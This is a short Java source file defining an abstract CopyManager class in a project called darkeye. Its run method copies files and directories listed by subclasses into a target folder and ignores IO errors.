package org.spray.darkeye.managers;

import java.io.File;
import java.io.IOException;
import java.util.List;

import org.spray.darkeye.objects.Data;
import org.spray.darkeye.utils.FileUtils;

import com.google.common.io.Files;

public abstract class CopyManager implements IManager {

	private String path;

	public CopyManager(String path) {
		this.path = path;
	}

	@Override
	public void run() {
		File dir = new File(path, getPath());
		
		if (getData() == null)
			return;

		getData().forEach(data -> {
			data.getFiles().forEach(fileData -> {
				try {
					if (!fileData.getFile().exists())
						return;

					File implDir = new File(dir, data.getName());

					if (!dir.exists())
						dir.mkdirs();

					if (!data.getName().isEmpty() && !implDir.exists())
						implDir.mkdirs();

					if (fileData.getFile().isDirectory())
						FileUtils.copyDirectory(fileData.getFile(), new File(implDir, fileData.getName()));
					else
						Files.copy(fileData.getFile(), new File(implDir, fileData.getName()));
				} catch (IOException e) {
					// File not found
				}
			});
		});
	}

	@Override
	public abstract String getPath();

	protected abstract List<Data> getData();
}
